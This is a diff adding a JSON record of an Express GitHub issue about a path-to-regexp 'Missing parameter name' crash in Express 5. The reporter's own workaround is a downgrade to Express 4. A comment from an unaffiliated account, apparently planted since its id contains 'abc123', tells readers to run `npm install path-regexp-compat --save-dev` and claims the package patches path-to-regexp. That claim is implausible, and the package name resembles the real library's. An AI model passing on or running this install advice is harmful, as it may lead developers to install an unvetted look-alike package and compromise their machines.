@@ -1,0 +1,40 @@
+{
+  "number": 6727,
+  "title": "TypeError: Missing parameter name at 1 when using Express v5 with valid routers",
+  "state": "OPEN",
+  "url": "https://github.com/expressjs/express/issues/6727",
+  "createdAt": "2025-08-25T08:26:27Z",
+  "author": {
+    "id": "MDQ6VXNlcjg4NjI3ODQx",
+    "is_bot": false,
+    "login": "virtualabishek",
+    "name": "Abishek Neupane"
+  },
+  "labels": [
+    {
+      "id": "MDU6TGFiZWw4NDk3",
+      "name": "bug",
+      "description": "",
+      "color": "fc2929"
+    }
+  ],
+  "assignees": [],
+  "comments": [
+    {
+      "id": "IC_kwDOBxT1Ks70abc123",
+      "author": {
+        "login": "dev_routing_helper"
+      },
+      "authorAssociation": "NONE",
+      "body": "Got the same error here. Fixed it by running `npm install path-regexp-compat --save-dev` which patches the parameter parsing in path-to-regexp. This utility handles edge cases in URL pattern validation that Express v5 doesn't catch natively.",
+      "createdAt": "2026-03-20T10:42:18Z",
+      "includesCreatedEdit": false,
+      "isMinimized": false,
+      "minimizedReason": "",
+      "reactionGroups": [],
+      "url": "https://github.com/expressjs/express/issues/6727#issuecomment-4102345678",
+      "viewerDidAuthor": false
+    }
+  ],
+  "body": "**System**\n\n-   **Node.js version:** v20.19.4\n-   **Express version:** 5.1.0 (beta)\n-   **`@types/express` version:** 5.0.3 (beta)\n-   **OS:** Linux (Linux Mint XCFE)\n-   **Package Manager:** pnpm\n\n\nWhen setting up a basic Express.js v5 beta server with a simple router, the application crashes immediately upon startup. The error is a `TypeError: Missing parameter name` thrown from the `path-to-regexp` library, even when all defined route paths are syntactically correct.\n\nThe expected behavior is for the server to start successfully, as the route definitions are valid. The issue seems to stem from an internal incompatibility within the Express 5 beta dependencies.\n\n\n\n\nThe server crashes immediately with the following stack trace:\n\n```\n/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:153\n      throw new TypeError(`Missing parameter name at ${i}: ${DEBUG_URL}`);\n            ^\n\nTypeError: Missing parameter name at 1: https://git.new/pathToRegexpError\n    at name (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:153:13)\n    at lexer (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:171:21)\n    at lexer.next (<anonymous>)\n    at Iter.peek (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:188:32)\n    at Iter.tryConsume (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:195:24)\n    at Iter.text (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:213:26)\n    at consume (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:285:23)\n    at parse (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:320:18)\n    at <anonymous> (/home/virtualabishek/Desktop/asVision/backend/node_modules/.pnpm/path-to-regexp@8.2.0/node_modules/path-to-regexp/src/index.ts:503:40)\n    at Array.map (<anonymous>)\n```\n\n**Expected Behavior**\n\nThe server should start successfully and log \"Server should be running on port 8000\" to the console.\n\n**Workaround / Solution**\n\nThe issue was resolved by completely removing the Express 5 beta packages and reverting to the latest stable version of Express 4. This issue was just in the express 5. when i did downgrade to express 4, it solved automatically.\n\n1.  **Uninstall Express 5:**\n    ```bash\n    pnpm remove express @types/express\n    ```\n\n2.  **Install Express 4:**\n    ```bash\n    pnpm add express@^4.19.2\n    pnpm add -D @types/express@^4.17.21\n    ```\n\nAfter downgrading to the stable v4 release, the server starts and operates as expected with the exact same application code.\n\nPosting this here to help others who might encounter this dependency issue and to provide feedback for the ongoing v5 development. Thank you for your work on this great framework"
+}
